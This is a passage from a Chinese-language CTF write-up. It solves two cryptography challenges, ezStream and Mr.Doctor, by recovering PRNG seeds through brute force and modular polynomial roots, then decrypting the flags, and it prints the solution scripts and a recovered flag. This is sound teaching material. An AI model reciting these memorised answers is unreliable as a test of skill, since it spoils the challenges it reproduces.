+ self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**(<span class="hljs-number">32</span>-<span class="hljs-number">1</span>), <span class="hljs-number">2</span>**<span class="hljs-number">32</span> -<span class="hljs-number">1</span>):<br>    lcg.seed = seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">17362</span>:<br>        <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>            lcg.seed = seed<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;seed = &quot;</span>, seed)<br>            <span class="hljs-keyword">break</span><br><br>lcg.<span class="hljs-built_in">next</span>()<br>lcg.<span class="hljs-built_in">next</span>()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br><br><span class="hljs-comment"># seed =  2376358340</span><br><span class="hljs-comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure><p>这里我选择的是第一个成功的来作为seed。跑的话大概三分钟跑到这。还好这题第一个就是正确的解。如果解在后面的话，又得重新跑了。不过想要遍历整个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>空间还是挺困难的。</p><p>在做Mr.Doctor的时候发现有更简单的解法。</p><p>我们去遍历损失的那16位数据即可。这个搜索空间可比之前的小的多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>):<br>    lcg.seed = (<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>        likeSeed.append((<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed)<br>        <span class="hljs-built_in">print</span>(likeSeed[-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> likeSeed:<br>    lcg.seed = i<br>    lcg.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br>    <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1137839988</span><br><span class="hljs-string">1137855425</span><br><span class="hljs-string">1137870862</span><br><span class="hljs-string">Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span><br><span class="hljs-string">Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span><br><span class="hljs-string">Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure><p>由于跑出来的结果并不止一个所以都进行运算即可。</p><h2 id="mrdoctor"><a class="markdownIt-Anchor" href="#mrdoctor"></a> Mr.Doctor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> string<br><br>table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA256</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.proof = []<br>        self.sha = <span class="hljs-number">0</span><br>        self.sha_flag = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encryption</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>):<br>            self.proof.append(flag[<span class="hljs-number">4</span> * i:<span class="hljs-number">4</span> + <span class="hljs-number">4</span> * i])<br>            self.sha = sha256(self.proof[i]).hexdigest().encode()<br>            self.sha_flag.append(bytes_to_long(self.sha))<br>        <span class="hljs-keyword">return</span> self.sha_flag<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = getPrime(<span class="hljs-number">64</span>)<br>        self.Amiya = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Rosmontis = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Blaze = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.seed = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>sha = SHA256()<br>sha_flag = sha.encryption()<br>elite = RHODES_ELITE()<br>elite.output()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ash = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SliverAsh = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br>W = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="hljs-number">3</span>) ^ (elite.<span class="hljs-built_in">next</span>() % <span class="hljs-number">100</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(sha_flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(W))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Amiya =  956366446278</span><br><span class="hljs-string">Rosmontis =  1061992537343</span><br><span class="hljs-string">Blaze =  636205571590</span><br><span class="hljs-string">Doctor =  18068433704538283397</span><br><span class="hljs-string">Ash =  1097363493609113</span><br><span class="hljs-string">SliverAsh =  2051431344160327</span><br><span class="hljs-string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>这题代码和ezStream挺像的。主体都是一个流加密。</p><p>我们可以得到第二轮加密时的seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 mod 18068433704538283397</span><br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>r = RHODES_ELITE()<br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">13</span>):<br>    r.seed =  (<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed<br>    <span class="hljs-keyword">if</span> r.<span class="hljs-built_in">next</span>() == <span class="hljs-number">2051431344160327</span>:<br>        <span class="hljs-comment"># seed = (1097363493609113 &lt;&lt; 12) + seed</span><br>        likeSeed.append((<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(likeSeed)<br><span class="hljs-comment"># [4494800869822930172]</span><br></code></pre></td></tr></table></figure><p>可以看到只有一个解。接下来我们还要求解初始的seed才能进行解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>    self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>    <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>这个实际上是一个整环上的运算。是在Zmod(18068433704538283397)上的一个多项式。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>=</mo><mn>4494800869822930172</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 \, mod \, 18068433704538283397</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>−</mo><mn>4494800869822930172</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">f(x)=956366446278x^2 + 1061992537343x + 636205571590 - 4494800869822930172  \, mod \, 18068433704538283397</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p><p>我们求解这个多项式即可得到对应的seed值。这里使用的SageMath来计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">R.&lt;x&gt; = Zmod(<span class="hljs-number">18068433704538283397</span>)[]<br>f = <span class="hljs-number">956366446278</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">1061992537343</span>*x + <span class="hljs-number">636205571590</span> - <span class="hljs-number">4494800869822930172</span><br>f.roots()<br><span class="hljs-comment"># [(12358488364449364025, 1), (626844643882, 1)]</span><br></code></pre></td></tr></table></figure><p>可以看到这里有两个值，12358488364449364025和626844643882。</p><p>这里seed要是40位的数才行。12358488364449364025是64位的，而626844643882是40位的。所以我们的seed是626844643882。</p><p>前面这部分只是这题的一部分难点。得到了seed后面怎么进行处理考虑了半天。这又是sha的又是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>e</mi><msup><mi>d</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">mod (seed^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 没有办法逆过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br></code></pre></td></tr></table></figure><p>当时看到有个table在这但是没有用到我还感到奇怪。现在看来，是叫我们暴力破解了。</p><p>字符集应该就是这个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">626844643882</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, 